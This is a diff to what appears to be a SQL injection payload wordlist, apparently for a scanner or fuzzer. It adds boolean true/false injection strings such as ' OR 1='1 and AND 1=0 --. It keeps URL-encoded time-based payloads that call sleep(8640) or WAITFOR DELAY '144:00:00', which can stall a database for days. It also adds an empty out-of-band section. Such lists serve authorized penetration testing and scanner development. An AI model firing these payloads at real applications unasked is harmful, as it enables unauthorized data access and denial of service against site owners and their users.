@@ -1,6 +1,21 @@
+# True false based sqli payloads
+AND 1=0 --
+AND 1=1 --
+' AND 1=0 --
+' AND 1=1 --
+" AND 1=0 --
+" AND 1=1 --
+' OR 1='1
+' OR 1='0
+
+# Time based sqli payloads
 %28select(*)from(select(sleep(8640)))shahmidoe%29--%20-%3B
 6%252Bdays%252Belapsed,%3BWAITFOR%20DELAY%20%27144:00:00%27--%20-
 
+# OOB based sqli payloads
+
+
+# Rest of the combinations
 -- 
 
 test" 
